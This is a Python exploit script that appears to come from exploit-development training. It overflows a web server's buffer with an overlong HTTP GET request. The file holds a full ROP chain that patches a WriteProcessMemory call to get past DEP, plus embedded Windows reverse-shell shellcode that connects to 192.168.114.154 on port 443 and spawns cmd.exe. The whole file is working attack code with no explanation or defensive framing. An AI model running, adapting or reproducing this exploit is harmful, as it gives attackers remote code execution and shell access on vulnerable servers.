import socket
import os
import sys
import struct

ip = "127.0.0.1"
port = 80

#\x00\x0a\x0d\x20\x25\x2f\x5c

CRASH_LEN = 5000  # change me
OFFSET = 4061  # change me

rop_nop = struct.pack("<I",0x61c0104d) # RETN

#rev shell custom p443
shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\xb8\xe0\xff\xff\xff\xf7\xd8\x8b\x5e\x08\x8b\x3c\x06\x8b\x36\x66\x39\x4f\x18\x75\xeb\xeb\x06\x5e\x89\x75\x04\xeb\x64\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\xbe\xe0\xff\xff\xff\xf7\xde\x8b\x4f\x18\x8b\x04\x37\x01\xd8\x89\x45\xfc\xe3\x3f\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x10\xc1\xca\x02\xc1\xca\x02\xc1\xca\x03\xc1\xca\x06\x01\xc2\xeb\xeb\x3b\x54\x24\x24\x75\xd6\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\xbf\xe1\xff\xff\xff\xf7\xdf\x89\x44\x3d\x01\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xbf\xe1\xff\xff\xff\xf7\xdf\xff\x54\x3d\x01\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x72\x9a\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\x66\xb9\x80\xff\x66\xf7\xd9\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
shellcode +=  b"\x90" * (500 - len(shellcode))

nops = b"\x90" * 20

# -fe4 = fffff01c
rop = struct.pack('<L', 0x1001c059)  # POP EBX # RETN  
rop += struct.pack('<L', 0xfffff004)
rop += struct.pack('<L', 0x1001d78a)  # SUB EBP,EBX # OR DH,D # RETN
rop += struct.pack('<L', 0x1001b8be)  # MOV EAX,EBP # POP ESI # POP EBP # RETN 
rop += struct.pack('<L', 0x41414141)  # padding for esi
rop += struct.pack('<L', 0xfffff004)  # padding for ebp
rop += struct.pack('<L', 0x1001d78a)  # SUB EBP,EBX # OR DH,D # RETN #xoring EBP for later

#jump over template
rop += struct.pack('<L', 0x1001454f)  # POP ESI # ADD ESP,1C # RETN 

#0:007> u poi(0x61C832D0)+0001b030 = KERNEL32!WriteProcessMemoryStub
# kernel32!WriteProcessMemory placeholder parameters
rop += struct.pack('<L', 0x61C832D0)    # Pointer to kernel32!WritePrivateProfileStringA (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
rop += struct.pack('<L', 0x61c72cff)    # RX from MODULE no aslr (Protect: 00000020) #sqlite3
rop += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
rop += struct.pack('<L', 0x61c72cff)    # lpBaseAddress = RX from MODULE no aslr (Protect: 00000020)
rop += struct.pack('<L', 0x22222222)    # lpBuffer = base address of shellcode (dynamically generated)
rop += struct.pack('<L', 0x11111111)    # nSize = size of shellcode  - 512
rop += struct.pack('<L', 0x61c73fe8)    # lpNumberOfBytesWritten = RW in MODULE no aslr (Protect: 00000004)
rop += struct.pack('<L', 0x41414141)  # padding for pop esi

#saving EAX into ESI
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN  
rop += struct.pack('<L', 0x1001d626)  # XOR ESI,ESI # RETN    **
rop += struct.pack('<L', 0x10021a3e)  # ADD ESI,EDI # RETN 0x00
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN 

#patching WPM
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN 
rop += struct.pack('<L', 0x10022199)  # INC EAX # RETN  
rop += struct.pack('<L', 0x61c30547)  # ADD EBP,EAX # RETN  -> saving eax in ebp
rop += struct.pack('<L', 0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** 
rop += struct.pack('<L', 0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** 
rop += struct.pack('<L', 0x10018606)  # POP ECX # RETN  
rop += struct.pack('<L', 0xfffe4fd0)
rop += struct.pack('<L', 0x1001641c)  # SUB EAX,ECX # RETN 
rop += struct.pack('<L', 0x1001e80f)  # INC ESI # ADD AL,5E # RETN
rop += struct.pack('<L', 0x1001e80f)  # INC ESI # ADD AL,5E # RETN
rop += struct.pack('<L', 0x1001e80f)  # INC ESI # ADD AL,5E # RETN
rop += struct.pack('<L', 0x1001e80f)  # INC ESI # ADD AL,5E # RETN
rop += struct.pack('<L', 0x10019457)  # ADD EAX,20 # RETN 
rop += struct.pack('<L', 0x10019457)  # ADD EAX,20 # RETN 
rop += struct.pack('<L', 0x10019457)  # ADD EAX,20 # RETN 
rop += struct.pack('<L', 0x10019457)  # ADD EAX,20 # RETN
rop += struct.pack('<L', 0x1001aee5)  # ADD EAX,8 # RETN   
rop += struct.pack('<L', 0x1001e80e)  # MOV DWORD PTR [ESI+4],EAX # POP ESI # RETN 
rop += struct.pack('<L', 0x41414141)  # padding for pop esi

#patching lpBuffer
rop += struct.pack('<L', 0x1001b8be)  # MOV EAX,EBP # POP ESI # POP EBP # RETN
rop += struct.pack('<L', 0x41414141)  # padding for pop ebp
rop += struct.pack('<L', 0x41414141)  # padding for pop esi
rop += struct.pack('<L', 0x1001aef5)  # ADD EAX,0C # RETN 
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN  
rop += struct.pack('<L', 0x1001d626)  # XOR ESI,ESI # RETN    **
rop += struct.pack('<L', 0x10021a3e)  # ADD ESI,EDI # RETN 0x00
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN 
rop += struct.pack('<L', 0x61c095e8)  # ADD EAX,1B8 # ADD CL,CL # RETN
rop += struct.pack('<L', 0x61c095e8)  # ADD EAX,1B8 # ADD CL,CL # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x1001e80e)  # MOV DWORD PTR [ESI+4],EAX # POP ESI # RETN 
rop += struct.pack('<L', 0x41414141)  # padding for pop esi

#patching nSize - 512
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x10022897)  # SUB EAX,20 # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN  
rop += struct.pack('<L', 0x1001d626)  # XOR ESI,ESI # RETN    **
rop += struct.pack('<L', 0x10021a3e)  # ADD ESI,EDI # RETN 0x00
rop += struct.pack('<L', 0x10015442)  # POP EAX # RETN 
rop += struct.pack('<L', 0xfffffaee)
rop += struct.pack('<L', 0x100231d1)  # NEG EAX # RETN    
rop += struct.pack('<L', 0x1001e80e)  # MOV DWORD PTR [ESI+4],EAX # POP ESI # RETN 
rop += struct.pack('<L', 0x41414141)  # padding for pop esi

#restoring back esp
rop += struct.pack('<L', 0x61c18d81)  # XCHG EAX,EDI # RETN  
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x1001614d)  # DEC EAX # RETN
rop += struct.pack('<L', 0x61c2c2f1)  # XCHG EAX,ESP # RETN  

print(900 - len(rop))
rop += b"\x90" * (900 - len(rop))

payload = b"A" * 2509
payload += rop

print(OFFSET - len(payload) + 4)

payload += shellcode
payload += b"\x90" * (OFFSET - len(payload) + 4)
payload += struct.pack("<I",0x10022877)   # ADD ESP,1004 # RETN
payload += b"\x90" * 10
payload += b"B" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
